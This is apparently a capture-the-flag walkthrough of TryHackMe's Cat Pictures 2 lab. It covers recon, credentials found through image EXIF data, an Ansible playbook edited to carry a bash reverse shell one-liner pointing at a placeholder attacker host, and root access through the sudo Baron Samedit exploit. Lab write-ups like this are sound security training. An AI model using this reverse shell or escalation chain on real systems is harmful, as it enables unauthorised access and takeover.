# Cat Pictures 2 Writeup

This is a walkthrough of the Cat Pictures 2 CTF from TryHackMe. The room can be accessed [here](https://tryhackme.com/room/catpictures2).

## Recon

I started by running an Nmap scan to identify open ports on the target machine:

```shell
nmap -sV -sC -p- <#TARGETIP> -o nmap
```

The scan revealed the following open ports:

 - 22 - OpenSSH 7.6p1
 - 80 - Nginx 1.4.6 (Lychee version 3.1.1 photo album with cat pictures)
 - 222 - OpenSSH 9.0 (Unusual port)
 - 1337 - OliveTin (Web interface to run predefined shell commands)
 - 3000 - Gitea (Lightweight DevOps platform)
 - 8080 - Nginx default webpage (Possibly with subdirectories)

 ## Web Pages

 I began exploring the web applications hosted on different ports:

 - Port 80: Found a Lychee photo album with cat pictures.

 - Port 1337: Discovered OliveTin, a web interface to execute scripts and run Ansible Playbooks.

 - Port 3000: Accessed Gitea, a platform that might be hosting scripts and runbooks.

 - Port 8080: Default Nginx webpage, further inspection may reveal subdirectories.

After running gobuster and checking for vulnerabilities, nothing significant was found. So, I focused on the cat pictures hosted on port 80.

## Cat Pictures Analysis

I downloaded all the cat pictures and checked them for exif data using exiftool. One picture revealed interesting information of a text file on a subdomain of one of the web applications:

Visiting the URL led me to a text file with the following information:

I managed to gain access to the website with the credentials from the text file and explored the user's repository, where I found `flag1.txt` (1/3 flags).

## Ansible Playbook

Next, I inspected the `playbook.yaml` file and noticed it contains a shell command: `shell: echo hi`.

 Knowing that OliveTin on port 1337 allows running Ansible Playbooks, I replaced the command with simple `bash` reverse shell payload from [RevShells.com](https://revshells.com).

 ```
bash -i >& /dev/tcp/<#ATTACKERIP>/<#ATTACKERPORT> 0>&1
 ```

Setting up a NetCat listener and clicking "Run Ansible Playbook" triggered the payload, which gave me a shell on the box. Exploring the user directory file gave me another text file named flag2.txt (2/3 flags).

## Privilege Escalation

With a reverse shell on the target machine, I looked around for interesting files and uploaded `linpeas.sh` to find vulnerabilities. One stood out: **[CVE-2021-3156] sudo Baron Samedit**.

To exploit this, I downloaded the exploit, uploaded it to the target machine, compiled it with `make`, and executed the `./sudo-hax-me-a-sandwich` outfile to gain root access.

From here, I moved to the `/root` file directory and found the flag3.txt (3/3 flags).
